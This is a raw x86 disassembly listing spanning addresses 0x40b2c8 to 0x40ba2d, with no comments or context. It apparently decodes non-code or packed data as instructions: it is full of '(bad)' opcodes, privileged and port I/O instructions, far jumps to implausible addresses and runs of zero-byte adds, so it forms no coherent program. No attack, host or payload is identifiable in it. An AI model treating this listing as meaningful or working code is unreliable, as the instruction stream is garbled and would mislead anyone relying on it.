  40b2c8:	cs ss (bad) 
  40b2cb:	shl    BYTE PTR [ecx],cl
  40b2cd:	and    DWORD PTR [ebp-0x6cdfce3c],ebx
  40b2d3:	mov    edi,0xc3f13a22
  40b2d8:	cmp    DWORD PTR ds:[ebp-0x40ffc52e],ecx
  40b2df:	mov    ebp,0xc8d87328
  40b2e4:	xor    eax,0x74bebe22
  40b2e9:	add    BYTE PTR ss:[eax],al
  40b2ec:	add    BYTE PTR [eax],al
  40b2ee:	add    BYTE PTR [eax-0x4fd2c241],dh
  40b2f4:	mov    WORD PTR [esi],cs
  40b2f6:	add    BYTE PTR [eax+0x266c58cc],dl
  40b2fc:	mov    cl,0x65
  40b2fe:	cmp    ch,BYTE PTR [edx]
  40b300:	mov    cl,0x4f
  40b302:	jae    0x40b32a
  40b304:	sbb    eax,0x251e3264
  40b309:	fs ins DWORD PTR es:[edi],dx
  40b30b:	or     dl,BYTE PTR [esi]
  40b30d:	push   0xc19ad6e
  40b312:	add    BYTE PTR [eax-0x2dabb6fe],dl
  40b318:	push   ecx
  40b319:	dec    eax
  40b31a:	inc    edx
  40b31b:	xchg   edi,eax
  40b31c:	dec    ebp
  40b31d:	dec    eax
  40b31e:	inc    esp
  40b31f:	aam    0x51
  40b321:	dec    edi
  40b322:	push   cs
  40b323:	sar    BYTE PTR [ebx],1
  40b325:	sti    
  40b326:	inc    eax
  40b327:	rcl    BYTE PTR [ebx+0x38],0x46
  40b32b:	sar    ebx,cl
  40b32d:	or     eax,DWORD PTR [eax]
  40b32f:	nop
  40b330:	adc    edx,edi
  40b332:	adc    al,0xa1
  40b334:	and    al,0xf9
  40b336:	push   edi
  40b337:	test   DWORD PTR [edx],esp
  40b339:	and    DWORD PTR [eax],ebx
  40b33b:	mov    ch,BYTE PTR [eax]
  40b33d:	loope  0x40b38e
  40b33f:	test   DWORD PTR [edx],ebx
  40b341:	or     BYTE PTR ds:0x7045f91,cl
  40b347:	(bad)  
  40b348:	sbb    DWORD PTR [edx],ecx
  40b34a:	add    esp,DWORD PTR [eax-0x67ebf1f7]
  40b350:	retf   0x7219
  40b353:	add    BYTE PTR [eax],al
  40b355:	add    BYTE PTR [eax],al
  40b357:	add    BYTE PTR [eax-0x63f00c3a],dl
  40b35d:	pop    ds
  40b35e:	neg    BYTE PTR [eax+ebx*4+0x15]
  40b362:	ds adc al,0x98
  40b365:	pop    es
  40b366:	(bad)  
  40b367:	(bad)  
  40b368:	fist   WORD PTR [edx]
  40b36a:	inc    esi
  40b36b:	or     cl,BYTE PTR [edi-0x6df3f2e9]
  40b371:	or     al,0x4e
  40b373:	add    BYTE PTR [edx+esi*4-0x4773f5e0],bl
  40b37a:	iret   
  40b37b:	pop    ecx
  40b37c:	xor    al,0xd5
  40b37e:	push   ss
  40b37f:	add    al,0x90
  40b381:	mov    dl,0xa7
  40b383:	xlat   BYTE PTR ds:[ebx]
  40b384:	test   eax,0x9ae48e23
  40b389:	pop    ebp
  40b38a:	mov    ss,eax
  40b38c:	mov    ds:0x88d3781c,eax
  40b391:	pop    edi
  40b392:	test   ch,cl
  40b394:	xor    BYTE PTR [edi],cl
  40b396:	pop    eax
  40b397:	jmp    0x40b3f8
  40b399:	push   edi
  40b39a:	adc    dh,0x2e
  40b39d:	mov    bl,0xff
  40b39f:	and    dl,ch
  40b3a1:	mov    dl,0xdb
  40b3a3:	inc    eax
  40b3a4:	sar    DWORD PTR [edi-0x56],1
  40b3a7:	dec    esp
  40b3a8:	jnp    0x40b35c
  40b3aa:	sbb    dh,BYTE PTR [eax-0x44d9f9c4]
  40b3b0:	push   edx
  40b3b1:	mov    bl,0x1e
  40b3b3:	retf   
  40b3b4:	imul   ebp,edi,0xf85ec43c
  40b3ba:	and    ch,BYTE PTR [esi+0x0]
  40b3c0:	add    BYTE PTR [edx+0x20],ah
  40b3c3:	gs scas eax,DWORD PTR es:[edi]
  40b3c5:	daa    
  40b3c6:	xor    ebp,DWORD PTR [esi+eax*4-0x19]
  40b3ca:	sbb    BYTE PTR [ebp-0x7a],ch
  40b3cd:	adc    edi,eax
  40b3cf:	push   ecx
  40b3d0:	mov    esp,0x3e608d7
  40b3d5:	nop
  40b3d6:	mov    dl,0x77
  40b3d8:	addr16 jp 0x40b36b
  40b3db:	pop    ebp
  40b3dc:	push   ebx
  40b3dd:	imul   esi,DWORD PTR [edx+0xae6e4ca],0xffffffcb
  40b3e4:	sahf   
  40b3e5:	iret   
  40b3e6:	sbb    eax,0x21e7e2c7
  40b3eb:	xchg   ch,dl
  40b3ed:	add    al,0x46
  40b3ef:	ret    0x1bd9
  40b3f2:	gs push gs
  40b3f5:	and    DWORD PTR [ecx-0x31],esp
  40b3f8:	ja     0x40b411
  40b3fa:	arpl   cx,bp
  40b3fc:	push   ecx
  40b3fd:	ds xor esi,esp
  40b400:	xchg   ebx,eax
  40b401:	in     eax,dx
  40b402:	push   esp
  40b403:	ror    DWORD PTR [ebx-0x8],1
  40b406:	add    ch,BYTE PTR [esi-0x57d70dbb]
  40b40c:	add    eax,DWORD PTR ds:[ebx]
  40b40f:	rcr    BYTE PTR [edi-0x26],1
  40b412:	cmc    
  40b413:	fisubr DWORD PTR [eax+0x5a9c314d]
  40b419:	push   eax
  40b41a:	inc    edi
  40b41b:	call   0x496f:0xc8fd5034
  40b422:	push   edx
  40b423:	test   al,0x22
  40b425:	add    BYTE PTR [eax],al
  40b427:	add    BYTE PTR [eax],al
  40b429:	add    BYTE PTR [edi],ch
  40b42b:	mov    eax,ds:0x84e2fca
  40b430:	fiadd  WORD PTR [ebx+0x3b]
  40b433:	push   ds
  40b434:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b435:	cmp    eax,0x8fbd5c3d
  40b43a:	sub    BYTE PTR [ecx],dl
  40b43c:	mov    edx,0xeb293e9
  40b441:	xlat   BYTE PTR ds:[ebx]
  40b442:	mov    ss,esi
  40b444:	test   DWORD PTR ds:[ebp+edx*8-0x31452dd3],eax
  40b44c:	and    al,0xd1
  40b44e:	pop    edi
  40b44f:	jle    0x40b4b0
  40b451:	mov    edi,0xab4cd883
  40b456:	(bad)  
  40b457:	loop   0x40b491
  40b459:	lds    ebx,FWORD PTR [ecx+0x6a]
  40b45c:	jae    0x40b40e
  40b45e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b45f:	fidiv  DWORD PTR [eax]
  40b461:	std    
  40b462:	push   edx
  40b463:	mov    dl,0xe
  40b465:	and    DWORD PTR [edx+edx*8-0x297ff5c9],ebx
  40b46c:	cmp    al,0x5
  40b46e:	jg     0x40b451
  40b470:	add    BYTE PTR es:[esi-0x22d0c829],dl
  40b477:	int3   
  40b478:	and    DWORD PTR ds:0x140faec1,ebp
  40b47e:	aad    0xb8
  40b480:	pop    es
  40b481:	aaa    
  40b482:	out    0xac,al
  40b484:	push   cs
  40b485:	sbb    ecx,ebx
  40b487:	les    esi,FWORD PTR [eax]
  40b489:	add    ebx,edi
  40b48b:	mov    edx,0x3239
  40b490:	add    BYTE PTR [eax],al
  40b492:	add    dl,dl
  40b494:	retf   0x2939
  40b497:	test   eax,0x8b000e97
  40b49c:	out    0x78,al
  40b49e:	gs jns 0x40b455
  40b4a1:	push   cs
  40b4a2:	add    BYTE PTR [eax+0x72544077],ch
  40b4a8:	jno    0x40b4f8
  40b4aa:	inc    edi
  40b4ab:	aaa    
  40b4ac:	fmul   QWORD PTR [esi+0x5c]
  40b4af:	das    
  40b4b0:	cdq    
  40b4b1:	inc    esi
  40b4b2:	inc    edx
  40b4b3:	cs iret 
  40b4b5:	dec    ebx
  40b4b6:	add    ch,dh
  40b4b8:	xor    ecx,DWORD PTR [ebp-0x7cc42067]
  40b4be:	mov    ch,dl
  40b4c0:	nop
  40b4c1:	adc    BYTE PTR [ecx-0x7074ac1e],0xc3
  40b4c8:	cdq    
  40b4c9:	or     edi,0xeb429
  40b4cf:	mov    ds:0xc78f8938,eax
  40b4d4:	fwait
  40b4d5:	loopne 0x40b4bb
  40b4d7:	mov    BYTE PTR [ebp-0x5e7262],bl
  40b4dd:	mov    DWORD PTR [eax-0x4c7cbbac],ebp
  40b4e3:	(bad)  
  40b4e4:	dec    esp
  40b4e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4e6:	mov    cs,WORD PTR [edx]
  40b4e8:	inc    esp
  40b4e9:	mov    ecx,0xf0571fa7
  40b4ee:	call   DWORD PTR [eax-0x7202efa]
  40b4f4:	repnz fild DWORD PTR [edi+0x0]
  40b4fb:	add    BYTE PTR [ebx],dl
  40b4fd:	nop
  40b4fe:	jmp    0x88319ff8
  40b503:	in     eax,0xd8
  40b505:	push   ebp
  40b506:	mov    eax,ds:0xb447e4ca
  40b50b:	out    0xcb,eax
  40b50d:	repnz mov bh,0xc0
  40b510:	ficom  WORD PTR [edi+0xb]
  40b513:	add    BYTE PTR [eax-0x3b2c42ae],dl
  40b519:	dec    esi
  40b51a:	mov    al,0xbb
  40b51c:	out    0xdb,eax
  40b51e:	mov    ch,0xc1
  40b520:	mov    dh,0x54
  40b522:	xchg   esp,eax
  40b523:	aam    0x8b
  40b525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b526:	call   0xc2e93f05
  40b52b:	in     al,dx
  40b52c:	jg     0x40b59e
  40b52e:	mov    bh,0xf1
  40b530:	imul   bx,ax,0xffe6
  40b534:	popa   
  40b535:	or     DWORD PTR [eax+eax*1],ecx
  40b538:	nop
  40b539:	or     DWORD PTR [eax+eax*1],ecx
  40b53c:	nop
  40b53d:	fs aaa 
  40b53f:	dec    edx
  40b540:	les    esp,FWORD PTR [eax]
  40b542:	sbb    ebp,DWORD PTR [edx-0x42]
  40b545:	arpl   WORD PTR [esi+0x74],sp
  40b548:	xor    BYTE PTR [eax],0x4a
  40b54b:	inc    ecx
  40b54c:	aam    0xed
  40b54e:	add    BYTE PTR [edi],ah
  40b550:	jns    0x40b55d
  40b552:	or     BYTE PTR [ebp-0x4d],al
  40b555:	cmp    DWORD PTR [esi+0x3b],edx
  40b558:	jo     0x40b586
  40b55a:	imul   esp,DWORD PTR [ebx-0x4b],0x4d3667
  40b561:	add    BYTE PTR [eax],al
  40b563:	add    BYTE PTR [eax],al
  40b565:	pop    ebp
  40b566:	pop    bp
  40b568:	pop    esi
  40b569:	outs   dx,DWORD PTR ds:[esi]
  40b56a:	aas    
  40b56b:	dec    edx
  40b56c:	inc    ebp
  40b56d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b56e:	fwait
  40b56f:	and    edx,DWORD PTR [esi+0x5b]
  40b572:	mov    dl,0x38
  40b574:	inc    edi
  40b575:	dec    edi
  40b576:	outs   dx,DWORD PTR ds:[esi]
  40b577:	cli    
  40b578:	es mov bh,0x8f
  40b57b:	sub    DWORD PTR [eax+0x57],eax
  40b57e:	jne    0x40b5a9
  40b580:	ss dec esp
  40b582:	imul   esi,edx,0x63
  40b585:	pop    ecx
  40b586:	popf   
  40b587:	add    DWORD PTR [edi],esi
  40b589:	addr16 mov edi,0xe56d0ff9
  40b58f:	(bad)  
  40b590:	and    eax,0x27d7ba38
  40b595:	data16 fmulp st(0),st
  40b598:	push   edi
  40b599:	cmp    eax,0x5b42cf89
  40b59e:	mov    edx,0xa091030b
  40b5a3:	sub    al,0x33
  40b5a5:	test   BYTE PTR [ebp-0x4cf8a906],ah
  40b5ab:	mov    ds:0xa9055abe,al
  40b5b0:	add    edx,DWORD PTR [eax-0x1296214e]
  40b5b6:	mov    ds:0x8ef86a1c,eax
  40b5bb:	fldenv [ecx-0x70]
  40b5be:	mov    dl,0x2e
  40b5c0:	mov    edi,0x71622e14
  40b5c5:	ins    BYTE PTR es:[edi],dx
  40b5c6:	in     eax,dx
  40b5c7:	sub    dh,BYTE PTR [ebp+0x0]
  40b5ca:	add    BYTE PTR [eax],al
  40b5cc:	add    BYTE PTR [eax],al
  40b5ce:	adc    al,0x3a
  40b5d0:	push   ecx
  40b5d1:	loope  0x40b621
  40b5d3:	icebp  
  40b5d4:	test   DWORD PTR fs:[ebx+ebp*1],edx
  40b5d8:	adc    DWORD PTR [edi+0x6c7a435a],ebp
  40b5de:	sub    BYTE PTR [ecx],al
  40b5e0:	aaa    
  40b5e1:	mov    DWORD PTR [eax],eax
  40b5e3:	cs and eax,0x31632edb
  40b5e9:	xchg   ebp,eax
  40b5ea:	dec    esp
  40b5eb:	or     eax,0x5f40910b
  40b5f0:	mov    tr5,edi
  40b5f3:	adc    BYTE PTR [esi-0xafcded1],ah
  40b5f9:	loopne 0x40b625
  40b5fb:	arpl   WORD PTR [ebp+0xeb294c2],di
  40b601:	outs   dx,BYTE PTR ds:[esi]
  40b602:	push   ss
  40b603:	dec    esi
  40b604:	lods   al,BYTE PTR ds:[esi]
  40b605:	xchg   BYTE PTR [esi+edi*1],al
  40b608:	mov    ecx,0xb3645c69
  40b60d:	xchg   ebx,eax
  40b60e:	sub    cl,BYTE PTR [ebx-0x45]
  40b611:	mov    esp,DWORD PTR [ebx]
  40b613:	cmp    al,0x9f
  40b615:	xor    cl,0x57
  40b618:	mov    ds:0x83442262,eax
  40b61d:	pop    esp
  40b61e:	sbb    eax,0x1373a166
  40b623:	sahf   
  40b624:	pushf  
  40b625:	imul   edx,DWORD PTR [esi],0x39
  40b628:	xchg   ebx,eax
  40b629:	pop    ebx
  40b62a:	repz dec ecx
  40b62c:	test   DWORD PTR [edi-0x6c],edx
  40b62f:	mov    dl,0xe
  40b631:	adc    al,0x0
  40b633:	add    BYTE PTR [eax],al
  40b635:	add    BYTE PTR [eax],al
  40b637:	rol    DWORD PTR [edx+ebx*1+0xe78c811],1
  40b63e:	adc    DWORD PTR [edx],0x3c
  40b641:	mov    DWORD PTR [ebx+0x18],ebp
  40b644:	cmp    BYTE PTR [edx-0x70c6f1df],dl
  40b64a:	jmp    0x44f68e2
  40b64f:	jnp    0x40b62b
  40b651:	sub    eax,0x6eca7611
  40b656:	or     eax,0x890ed494
  40b65b:	mul    DWORD PTR [esi-0x4b]
  40b65e:	dec    esi
  40b65f:	sbb    BYTE PTR [ebp-0xf],dl
  40b662:	arpl   dx,di
  40b664:	psubsb mm5,QWORD PTR fs:[eax]
  40b668:	mov    bh,0x2
  40b66a:	loopne 0x40b686
  40b66c:	imul   ecx,DWORD PTR [esi],0x0
  40b66f:	cmp    esi,DWORD PTR [ebx-0x4f19fff2]
  40b675:	pop    ss
  40b676:	add    eax,0x4c1d17ec
  40b67b:	icebp  
  40b67c:	and    al,0x6
  40b67e:	add    BYTE PTR [edx-0x73c6d52d],bl
  40b684:	sar    DWORD PTR [ecx],1
  40b686:	and    ecx,DWORD PTR [ecx-0x54]
  40b689:	sub    bh,BYTE PTR [eax]
  40b68b:	jmp    0x1840c540
  40b690:	std    
  40b691:	jmp    0xfa4bbf8b
  40b696:	loopne 0x40b69f
  40b698:	or     ecx,edi
  40b69a:	retf   0x0
  40b69d:	add    BYTE PTR [eax],al
  40b69f:	add    BYTE PTR ds:0xf5c2d0f1,cl
  40b6a5:	jmp    0x482f9d8d
  40b6aa:	rcr    dl,0xec
  40b6ad:	pop    eax
  40b6ae:	cwde   
  40b6af:	not    DWORD PTR [ebx]
  40b6b1:	push   ss
  40b6b2:	icebp  
  40b6b3:	enter  0x19,0xeb
  40b6b7:	out    dx,eax
  40b6b8:	or     esp,DWORD PTR [ecx-0x11]
  40b6bb:	test   DWORD PTR [eax],0x69e7e916
  40b6c1:	mov    al,0xe
  40b6c3:	add    BYTE PTR [edx+0x6d],dl
  40b6c6:	imul   esp,DWORD PTR [ebp+0x46],0x6f
  40b6ca:	jbe    0x40b71d
  40b6cc:	inc    edx
  40b6cd:	xchg   ebx,eax
  40b6ce:	jno    0x40b6d0
  40b6d0:	fiadd  DWORD PTR [edx-0x42]
  40b6d3:	mov    ebp,0x80b34706
  40b6d8:	sbb    al,0x41
  40b6da:	mov    bh,0xa9
  40b6dc:	rcl    DWORD PTR [ecx-0x80],0xbc
  40b6e0:	sub    DWORD PTR [eax+0x4584000e],esi
  40b6e6:	xchg   ebx,eax
  40b6e7:	out    0x85,al
  40b6e9:	in     al,dx
  40b6ea:	xchg   ecx,eax
  40b6eb:	loop   0x40b67d
  40b6ed:	rcr    esp,0x91
  40b6f0:	nop
  40b6f1:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  40b6f3:	mov    cl,0xee
  40b6f5:	test   DWORD PTR [ebp-0x5a],edi
  40b6f8:	inc    ecx
  40b6f9:	fsubr  QWORD PTR [ecx+0x5a3190bb]
  40b6ff:	je     0x40b681
  40b701:	mov    ds:0x756e,eax
  40b706:	add    BYTE PTR [eax],al
  40b708:	add    BYTE PTR [eax-0xe0e3cb2],dl
  40b70e:	neg    ah
  40b710:	loope  0x40b6ee
  40b712:	inc    edi
  40b713:	mov    ebp,0xd6f1def4
  40b718:	jmp    0x1bcf:0xffdbe9de
  40b71f:	or     eax,0xf303aa09
  40b724:	sbb    BYTE PTR [edi-0x61e8d8de],cl
  40b72a:	out    dx,al
  40b72b:	or     dl,BYTE PTR [edi]
  40b72d:	xchg   ebx,eax
  40b72e:	cli    
  40b72f:	cld    
  40b730:	pop    es
  40b731:	jb     0x40b722
  40b733:	clc    
  40b734:	sbb    al,0x8e
  40b736:	pop    es
  40b737:	test   DWORD PTR [ebx+eax*4],0xa11a1f06
  40b73e:	pop    esp
  40b73f:	sub    eax,0xfff4b13c
  40b744:	call   DWORD PTR [eax-0x62f9f1f7]
  40b74a:	or     ch,ah
  40b74c:	inc    ecx
  40b74d:	rcr    BYTE PTR [edx-0x1a],cl
  40b750:	adc    BYTE PTR [eax-0x6ffff3f7],al
  40b756:	icebp  
  40b757:	push   ebp
  40b758:	outs   dx,BYTE PTR ds:[esi]
  40b759:	fnstcw WORD PTR [esi]
  40b75b:	xor    DWORD PTR [ebp+ebp*8+0x56],edx
  40b75f:	cmp    DWORD PTR [ecx-0x1f],eax
  40b762:	jmp    0x5413f99f
  40b767:	dec    ebx
  40b768:	inc    ebx
  40b769:	xlat   BYTE PTR ds:[ebx]
  40b76a:	mov    dl,0xa9
  40b76c:	add    eax,DWORD PTR [eax]
  40b76e:	add    BYTE PTR [eax],al
  40b770:	add    BYTE PTR [eax],al
  40b772:	nop
  40b773:	mov    dl,0xc8
  40b775:	sub    BYTE PTR [ecx-0x1b],dh
  40b778:	fcomip st,st(3)
  40b77a:	sbb    al,0xe2
  40b77d:	idiv   DWORD PTR [ecx+ebp*4-0x1e]
  40b781:	add    edx,DWORD PTR [eax+0x3d3f3b2]
  40b787:	and    edx,DWORD PTR [edx]
  40b789:	leave  
  40b78a:	loopne 0x40b782
  40b78c:	std    
  40b78d:	scas   al,BYTE PTR es:[edi]
  40b78e:	leave  
  40b78f:	std    
  40b790:	jmp    0x9003:0xcceb2fc6
  40b797:	mov    dl,0xdf
  40b799:	add    al,0x84
  40b79b:	mov    al,0xf3
  40b79d:	jmp    0x40b731
  40b79f:	js     0x40b789
  40b7a1:	cmc    
  40b7a2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7a3:	mov    dl,0x5d
  40b7a5:	cmp    ebp,DWORD PTR [ecx-0x76]
  40b7a8:	daa    
  40b7a9:	inc    eax
  40b7aa:	dec    eax
  40b7ab:	jge    0x40b7d9
  40b7ad:	xor    al,BYTE PTR [eax-0x7d]
  40b7b0:	pop    ds
  40b7b1:	xor    al,0x21
  40b7b3:	xor    BYTE PTR ds:0x37823c2c,0x4e
  40b7ba:	inc    eax
  40b7bb:	push   0x77513933
  40b7c0:	es cmp esi,esi
  40b7c3:	mov    dl,0xdc
  40b7c5:	adc    esi,DWORD PTR [ebx-0x48a23534]
  40b7cb:	enter  0x3c6,0x90
  40b7cf:	mov    dl,0xe7
  40b7d1:	dec    eax
  40b7d2:	loope  0x40b847
  40b7d4:	mov    dh,0x37
  40b7d6:	add    BYTE PTR [eax],al
  40b7d8:	add    BYTE PTR [eax],al
  40b7da:	add    dl,dl
  40b7dc:	test   dl,cl
  40b7de:	cmp    DWORD PTR [edi-0x3ec14e95],edi
  40b7e4:	jbe    0x40b788
  40b7e6:	xor    ecx,esp
  40b7e8:	mov    dl,0x1b
  40b7ea:	cmc    
  40b7eb:	ins    BYTE PTR es:[edi],dx
  40b7ec:	mov    edi,0xc093ec0e
  40b7f1:	or     cl,dh
  40b7f3:	mov    BYTE PTR [esi-0x4d6f0ffc],dh
  40b7f9:	push   cs
  40b7fa:	shl    BYTE PTR [edi],cl
  40b7fc:	rcr    DWORD PTR [edi],0xe7
  40b7ff:	sub    al,0xa7
  40b801:	and    al,0xf0
  40b803:	xchg   ecx,eax
  40b804:	rcr    BYTE PTR [ebx],0xd8
  40b807:	mov    dh,0xb5
  40b809:	pop    ss
  40b80a:	loop   0x40b803
  40b80c:	sbb    eax,esi
  40b80e:	sbb    BYTE PTR [ebx-0x62],0x72
  40b812:	outs   dx,BYTE PTR ds:[esi]
  40b813:	ins    DWORD PTR es:[edi],dx
  40b814:	leave  
  40b815:	pop    ds
  40b816:	and    eax,0xe9719645
  40b81b:	xchg   ebx,eax
  40b81c:	mov    dl,0xe
  40b81e:	lds    edi,FWORD PTR [edi+0x25a0ec22]
  40b824:	add    dl,bl
  40b826:	jmp    0x2f4f6abe
  40b82b:	test   DWORD PTR [ebp-0x5ba5b8b3],eax
  40b831:	pusha  
  40b832:	cmp    DWORD PTR [edx+esi*4-0x595d06f2],ecx
  40b839:	bswap  ecx
  40b83b:	jo     0x40b820
  40b83d:	adc    eax,esp
  40b83f:	add    BYTE PTR [eax],al
  40b841:	add    BYTE PTR [eax],al
  40b843:	add    BYTE PTR [ebp-0x4e],bh
  40b846:	push   cs
  40b847:	adc    dh,BYTE PTR [ecx]
  40b849:	xchg   edi,eax
  40b84a:	push   cs
  40b84b:	test   DWORD PTR [edx+0x5],eax
  40b84e:	rol    DWORD PTR [ebx-0x562f17c6],cl
  40b854:	sub    bl,BYTE PTR [ecx-0x36]
  40b857:	mov    fs,WORD PTR [ebx+edi*8]
  40b85a:	push   cs
  40b85b:	sbb    DWORD PTR [esp+ebx*8-0x4d73e6f2],edx
  40b862:	push   cs
  40b863:	sbb    DWORD PTR [edx-0x6c16f11e],ecx
  40b869:	mov    dl,0xe
  40b86b:	add    BYTE PTR [ecx],bh
  40b86d:	mov    ch,0xe
  40b86f:	add    BYTE PTR [ecx],bh
  40b871:	mov    ch,0xe
  40b873:	add    BYTE PTR [ecx],ch
  40b875:	mov    ch,0xd
  40b877:	add    al,dh
  40b879:	inc    eax
  40b87a:	dec    esi
  40b87b:	add    BYTE PTR [esp+ebp*1+0x2a57004e],ah
  40b882:	dec    esi
  40b883:	add    ah,ah
  40b885:	sub    DWORD PTR [esi+0x0],ecx
  40b888:	sub    BYTE PTR [ebx],0x4e
  40b88b:	add    BYTE PTR [edx],dh
  40b88d:	dec    ebp
  40b88e:	xor    BYTE PTR [eax],al
  40b890:	xor    al,0x4d
  40b892:	dec    esi
  40b893:	add    BYTE PTR [esi+0x46],dh
  40b896:	dec    esi
  40b897:	add    BYTE PTR [ebp+0x11004e61],ah
  40b89d:	and    cl,BYTE PTR [eax+eax*1+0x52]
  40b8a1:	inc    esi
  40b8a2:	xor    BYTE PTR [eax],al
  40b8a4:	mov    ah,0x46
  40b8a6:	dec    esi
  40b8a7:	add    BYTE PTR [eax],al
  40b8a9:	add    BYTE PTR [eax],al
  40b8ab:	add    BYTE PTR [eax],al
  40b8ad:	ss dec ebp
  40b8af:	dec    esi
  40b8b0:	add    BYTE PTR [edx+0x6e004e4c],bh
  40b8b6:	xchg   ecx,eax
  40b8b7:	jp     0x40b909
  40b8b9:	jnp    0x40b932
  40b8bb:	imul   eax,DWORD PTR [ecx+0x4d],0xffffff8a
  40b8bf:	jl     0x40b926
  40b8c1:	mov    al,BYTE PTR [ebx+0x7775000e]
  40b8c7:	ins    DWORD PTR es:[edi],dx
  40b8c8:	fs jne 0x40b948
  40b8cb:	ins    BYTE PTR es:[edi],dx
  40b8cc:	jb     0x40b856
  40b8ce:	test   BYTE PTR [ebp+0x41],dh
  40b8d1:	jns    0x40b887
  40b8d3:	push   cs
  40b8d4:	add    BYTE PTR [edi-0x4c],dl
  40b8d7:	push   0x0
  40b8d9:	mov    BYTE PTR [esi-0x4b96ff86],ch
  40b8df:	push   cs
  40b8e0:	add    BYTE PTR [edx],ch
  40b8e2:	mov    ah,0x3f
  40b8e4:	add    BYTE PTR [edi],ch
  40b8e6:	mov    ah,0x5a
  40b8e8:	add    BYTE PTR [eax-0x6fbef3a8],dl
  40b8ee:	pop    ebx
  40b8ef:	or     al,0x45
  40b8f1:	nop
  40b8f2:	dec    ebp
  40b8f3:	or     al,0x4d
  40b8f5:	nop
  40b8f6:	add    cl,BYTE PTR [ebx+eiz*2]
  40b8f9:	nop
  40b8fa:	pop    ebx
  40b8fb:	or     al,0x6f
  40b8fd:	nop
  40b8fe:	pop    esp
  40b8ff:	or     al,0x6f
  40b901:	nop
  40b902:	daa    
  40b903:	or     al,0x74
  40b905:	nop
  40b906:	push   ebp
  40b907:	or     al,0x57
  40b909:	nop
  40b90a:	xor    cl,BYTE PTR [esi+ebp*2]
  40b90d:	nop
  40b90e:	sub    eax,0x6f0c
  40b913:	add    BYTE PTR [eax],al
  40b915:	add    BYTE PTR [eax-0x6f8cf468],dl
  40b91b:	jmp    0x35d1072b
  40b920:	or     al,0x5c
  40b922:	nop
  40b923:	dec    esp
  40b924:	or     al,0x75
  40b926:	nop
  40b927:	jnp    0x40b933
  40b929:	jb     0x40b8bb
  40b92b:	outs   dx,BYTE PTR ds:[esi]
  40b92c:	or     ch,BYTE PTR [esi-0x70]
  40b92f:	jne    0x40b93b
  40b931:	push   esi
  40b932:	nop
  40b933:	outs   dx,BYTE PTR ds:[esi]
  40b934:	or     dh,BYTE PTR [edx-0x70]
  40b937:	fmul   QWORD PTR [edx]
  40b939:	imul   edx,DWORD PTR [eax-0x6f91f598],0x90500abd
  40b943:	fisttp DWORD PTR [edx]
  40b945:	outs   dx,DWORD PTR ds:[esi]
  40b946:	nop
  40b947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b948:	or     ch,BYTE PTR [ecx-0x70]
  40b94b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b94c:	or     ah,BYTE PTR [ebp-0x70]
  40b94f:	int    0xa
  40b951:	imul   edx,DWORD PTR [eax-0x6f8bf544],0x90250acd
  40b95b:	sbb    al,0xc
  40b95d:	add    BYTE PTR [eax-0x6f8df547],dl
  40b963:	sbb    BYTE PTR [esi+eiz*2],cl
  40b966:	nop
  40b967:	mov    dl,0xde
  40b969:	add    esi,esp
  40b96b:	mov    dl,0xca
  40b96d:	add    ecx,ecx
  40b96f:	mov    dl,0xca
  40b971:	add    esi,ecx
  40b973:	mov    dl,0xc8
  40b975:	add    esi,DWORD PTR [ebp+0x395b2]
  40b97b:	add    BYTE PTR [eax],al
  40b97d:	add    BYTE PTR [eax],al
  40b97f:	mov    cl,0xb2
  40b981:	mov    ecx,0xe5b2a803
  40b986:	add    edx,DWORD PTR [eax+0x664fe5b2]
  40b98c:	mov    ecx,0xb95e4fe6
  40b991:	hlt    
  40b992:	lds    ecx,FWORD PTR [edi-0x66]
  40b995:	icebp  
  40b996:	lds    eax,FWORD PTR [edi-0x66]
  40b999:	repz es retf 0xdb54
  40b99e:	add    esi,DWORD PTR [ebp-0x4e]
  40b9a1:	in     eax,0x3
  40b9a3:	nop
  40b9a4:	mov    dl,0xca
  40b9a6:	add    esp,DWORD PTR [ebp-0x4e]
  40b9a9:	retf   0x6003
  40b9ac:	mov    dl,0xe5
  40b9ae:	add    edx,DWORD PTR [eax+0x513635b2]
  40b9b4:	mov    dl,0x4
  40b9b6:	leave  
  40b9b7:	push   ecx
  40b9b8:	mov    dl,0x4
  40b9ba:	leave  
  40b9bb:	push   ecx
  40b9bc:	mov    dl,0x4
  40b9be:	leave  
  40b9bf:	push   ecx
  40b9c0:	mov    dl,0x15
  40b9c2:	ss push ecx
  40b9c4:	mov    dl,0x4
  40b9c6:	leave  
  40b9c7:	push   ecx
  40b9c8:	mov    dl,0x15
  40b9ca:	ss push ecx
  40b9cc:	mov    dl,0xa1
  40b9ce:	(bad)  
  40b9cf:	push   ecx
  40b9d0:	mov    dl,0x28
  40b9d2:	popa   
  40b9d3:	and    al,0x70
  40b9d5:	push   cs
  40b9d6:	pop    eax
  40b9d7:	sub    eax,0xff61ef69
  40b9dc:	mov    al,ds:0x8bfc651a
  40b9e1:	add    BYTE PTR [edx+0x0],bl
  40b9e4:	add    BYTE PTR [eax],al
  40b9e6:	add    BYTE PTR [eax],al
  40b9e8:	rcr    BYTE PTR [ebx-0x7b12def2],cl
  40b9ee:	push   0xfffffffd
  40b9f0:	lock outs dx,DWORD PTR ds:[esi]
  40b9f2:	jbe    0x40b9dd
  40b9f4:	xchg   ebx,eax
  40b9f5:	mov    dl,0xe
  40b9f7:	mov    edx,0xc0489ef0
  40b9fc:	mov    edi,0xb1bf458f
  40ba01:	test   DWORD PTR [esp+edx*8-0x54],edi
  40ba05:	sahf   
  40ba06:	gs into 
  40ba08:	fnstenv [eax+0x75]
  40ba0b:	mov    eax,ds:0xbd6a84ac
  40ba10:	mov    al,0xb2
  40ba12:	push   cs
  40ba13:	sbb    BYTE PTR [ecx+esi*2+0x7195d70e],cl
  40ba1a:	push   cs
  40ba1b:	jmp    0x7105:0xc40e711d
  40ba22:	push   cs
  40ba23:	mov    al,0x5e
  40ba25:	jge    0x40ba86
  40ba27:	jbe    0x40b9ca
  40ba29:	ficomp WORD PTR [esi+0x7b]
  40ba2c:	pop    edx
  40ba2d:	xchg   ecx,eax
